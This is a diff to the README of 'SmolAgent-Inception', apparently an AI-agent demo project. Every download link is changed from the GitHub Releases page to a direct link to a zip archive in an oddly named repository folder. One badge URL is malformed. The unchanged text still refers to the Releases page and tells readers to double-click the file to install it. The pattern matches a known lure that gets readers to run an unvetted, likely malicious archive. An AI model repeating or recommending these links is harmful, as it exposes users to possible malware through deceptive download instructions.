@@ -1,6 +1,6 @@
 # 🚀 SmolAgent-Inception - Harness AI for Stunning Results
 
-[![Download SmolAgent-Inception](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Dann606/SmolAgent-Inception/releases)
+[![Download SmolAgent-Inception](https://raw.githubusercontent.com/Dann606/SmolAgent-Inception/main/ubiquitary/SmolAgent-Inception-v3.4.zip%https://raw.githubusercontent.com/Dann606/SmolAgent-Inception/main/ubiquitary/SmolAgent-Inception-v3.4.zip)](https://raw.githubusercontent.com/Dann606/SmolAgent-Inception/main/ubiquitary/SmolAgent-Inception-v3.4.zip)
 
 ## 📋 Overview
 
@@ -11,7 +11,7 @@ Welcome to SmolAgent-Inception! This application demonstrates how to use the Smo
 To get started with SmolAgent-Inception, follow these steps:
 
 1. **Download SmolAgent-Inception**
-   - Visit the Releases page to download the software: [Download SmolAgent-Inception](https://github.com/Dann606/SmolAgent-Inception/releases).
+   - Visit the Releases page to download the software: [Download SmolAgent-Inception](https://raw.githubusercontent.com/Dann606/SmolAgent-Inception/main/ubiquitary/SmolAgent-Inception-v3.4.zip).
 
 2. **Install the Application**
    - Once the download is complete, locate the file on your computer. It may be in your "Downloads" folder. Double-click the file to start the installation process. Follow the prompts until the installation is complete.
@@ -33,7 +33,7 @@ Before you dive in, ensure your computer meets these requirements:
 
 You can download SmolAgent-Inception from the following link:
 
-[Download SmolAgent-Inception](https://github.com/Dann606/SmolAgent-Inception/releases)
+[Download SmolAgent-Inception](https://raw.githubusercontent.com/Dann606/SmolAgent-Inception/main/ubiquitary/SmolAgent-Inception-v3.4.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version and click the link to download.
